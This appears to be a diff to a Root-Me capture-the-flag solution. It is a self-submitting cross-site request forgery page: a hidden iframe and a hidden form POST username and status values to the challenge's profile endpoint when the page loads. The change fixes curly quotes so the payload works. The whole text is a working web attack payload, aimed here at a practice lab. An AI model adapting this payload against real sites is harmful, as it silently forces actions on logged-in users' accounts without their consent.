@@ -1,7 +1,7 @@
 <iframe style="display:none" name="csrf-frame"></iframe>
-<form id=“csrf-form” target="csrf-frame" method=“POST” enctype="multipart/form-data" action=“http://challenge01.root-me.org/web-client/ch22/?action=profile">
-<input type=“hidden” name=“username” value=“hey”>
-<input type=“hidden” name=“status” value=“on”>
+<form id="csrf-form" target="csrf-frame" method="post" enctype="multipart/form-data" action="http://challenge01.root-me.org/web-client/ch22/?action=profile">
+<input type="hidden" name="username" value="hey">
+<input type="hidden" name="status" value="on">
 <input type="submit" value="submit">
 </form>
 <script>document.getElementById("csrf-form").submit()</script>
